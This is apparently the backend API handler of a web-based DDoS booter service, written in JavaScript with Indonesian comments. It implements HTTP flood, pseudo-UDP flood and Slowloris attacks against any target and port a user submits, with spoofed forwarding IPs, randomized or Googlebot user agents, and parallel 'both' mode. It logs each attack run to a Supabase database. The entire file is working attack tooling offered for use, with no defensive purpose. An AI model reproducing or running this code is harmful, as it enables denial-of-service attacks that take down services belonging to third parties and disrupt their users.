// Import dari supabaseClient
import { supabase } from '../src/supabaseClient'

// Fungsi buat generate random IP palsu
function randomIP() {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
}

// HTTP Flood attack
async function httpFlood(target, port, duration) {
  const endTime = Date.now() + (duration * 1000)
  let attackCount = 0
  
  while (Date.now() < endTime) {
    try {
      const controller = new AbortController()
      const timeoutId = setTimeout(() => controller.abort(), 5000)
      
      const response = await fetch(`http://${target}:${port}`, {
        method: 'GET',
        headers: {
          'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/${Math.floor(Math.random() * 500) + 500}.36`,
          'X-Forwarded-For': randomIP(),
          'Cache-Control': 'no-cache',
          'Connection': 'keep-alive',
          'Accept': '*/*',
          'Accept-Language': 'en-US,en;q=0.9',
          'Referer': `http://${randomIP()}/`
        },
        signal: controller.signal
      }).catch(() => null)
      
      clearTimeout(timeoutId)
      
      if (response) {
        attackCount++
        // Abort biar ga nunggu response complete
        response.body?.cancel()
      }
      
      // Delay kecil biar ga keganjel limit
      await new Promise(resolve => setTimeout(resolve, 10))
    } catch (e) {
      // Abaikan error, terus serang
    }
  }
  
  return attackCount
}

// UDP Flood simulation (via HTTP approximation) dengan random port
async function udpFlood(target, port, duration) {
  const endTime = Date.now() + (duration * 1000)
  let attackCount = 0
  const ports = [port, 53, 80, 443, 8080, 22, 21, 25, 3306, 5432]
  
  while (Date.now() < endTime) {
    try {
      // Random port biar server bingung
      const randomPort = ports[Math.floor(Math.random() * ports.length)]
      
      // Pake fetch dengan method aneh biar server bingung
      const methods = ['OPTIONS', 'TRACE', 'PATCH', 'DELETE', 'HEAD', 'PROPFIND', 'SEARCH']
      const method = methods[Math.floor(Math.random() * methods.length)]
      
      const controller = new AbortController()
      const timeoutId = setTimeout(() => controller.abort(), 800)
      
      await fetch(`http://${target}:${randomPort}`, {
        method: method,
        headers: {
          'Content-Length': '9999999',
          'X-Forwarded-For': randomIP(),
          'X-Real-IP': randomIP(),
          'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
        },
        signal: controller.signal
      }).catch(() => {
        attackCount++
      })
      
      clearTimeout(timeoutId)
    } catch (e) {
      attackCount++
    }
  }
  
  return attackCount
}

// Slowloris attack - tahan koneksi tetap terbuka
async function slowlorisAttack(target, port, duration) {
  const endTime = Date.now() + (duration * 1000)
  let attackCount = 0
  const sockets = []
  
  while (Date.now() < endTime && sockets.length < 500) {
    try {
      const controller = new AbortController()
      
      // Kirim partial request biar server nunggu
      const response = await fetch(`http://${target}:${port}`, {
        method: 'POST',
        headers: {
          'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/${Math.floor(Math.random() * 500) + 500}.36`,
          'X-Forwarded-For': randomIP(),
          'Content-Length': '1000000',
          'Connection': 'keep-alive'
        },
        body: '--boundary\r\nContent-Disposition: form-data; name="file"\r\n\r\n',
        signal: controller.signal
      }).catch(() => null)
      
      if (response) {
        sockets.push(controller)
        attackCount++
      }
      
      await new Promise(resolve => setTimeout(resolve, 100))
    } catch (e) {
      // Lanjut
    }
  }
  
  return attackCount
}

export default async function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*')
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS')
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type')
  
  if (req.method === 'OPTIONS') {
    res.status(200).end()
    return
  }
  
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' })
  }
  
  try {
    const { target, port, duration, attackType, userId, userEmail, userName } = req.body
    
    // Validasi input
    if (!target || !port || !duration || !attackType) {
      return res.status(400).json({ error: 'Missing required fields' })
    }
    
    // Bersihin target dari http/https
    const cleanTarget = target.replace(/^https?:\/\//, '').split('/')[0]
    
    console.log(`[ATTACK] Starting ${attackType} attack on ${cleanTarget}:${port} for ${duration}s`)
    
    // Log aktivitas ke database
    const { data: logData, error: logError } = await supabase
      .from('attack_logs')
      .insert([
        {
          user_id: userId,
          user_email: userEmail,
          user_name: userName,
          target: cleanTarget,
          port: parseInt(port),
          duration: parseInt(duration),
          attack_type: attackType,
          status: 'started',
          started_at: new Date().toISOString()
        }
      ])
      .select()
    
    if (logError) {
      console.error('Error logging attack:', logError)
    }
    
    const logId = logData?.[0]?.id
    
    // Mulai serangan
    let attackCount = 0
    
    switch(attackType) {
      case 'http':
        attackCount = await httpFlood(cleanTarget, port, duration)
        break
      case 'udp':
        attackCount = await udpFlood(cleanTarget, port, duration)
        break
      case 'slowloris':
        attackCount = await slowlorisAttack(cleanTarget, port, duration)
        break
      case 'both':
        // Jalankan semua serangan paralel
        const [httpCount, udpCount, slowCount] = await Promise.all([
          httpFlood(cleanTarget, port, duration),
          udpFlood(cleanTarget, port, Math.floor(duration/2)),
          slowlorisAttack(cleanTarget, port, Math.floor(duration/2))
        ])
        attackCount = httpCount + udpCount + slowCount
        break
      default:
        attackCount = await httpFlood(cleanTarget, port, duration)
    }
    
    // Update log dengan hasil
    if (logId) {
      await supabase
        .from('attack_logs')
        .update({
          status: 'completed',
          attack_count: attackCount,
          completed_at: new Date().toISOString()
        })
        .eq('id', logId)
    }
    
    // Simpan juga ke aktivitas user
    await supabase
      .from('user_activities')
        .insert([
        {
          user_id: userId,
          user_email: userEmail,
          user_name: userName,
          activity_type: 'ddos_attack',
          details: `Melakukan serangan ${attackType.toUpperCase()} ke ${cleanTarget}:${port} selama ${duration} detik (${attackCount} packets)`,
          target: cleanTarget,
          port: port,
          attack_type: attackType,
          duration: duration,
          attack_count: attackCount,
          created_at: new Date().toISOString()
        }
      ])
    
    res.status(200).json({
      success: true,
      message: `Attack completed! Sent ${attackCount} packets to ${cleanTarget}:${port}`,
      attackCount,
      target: cleanTarget,
      port,
      duration,
      attackType
    })
    
  } catch (error) {
    console.error('Attack error:', error)
    res.status(500).json({ 
      error: 'Internal server error',
      details: error.message 
    })
  }
}
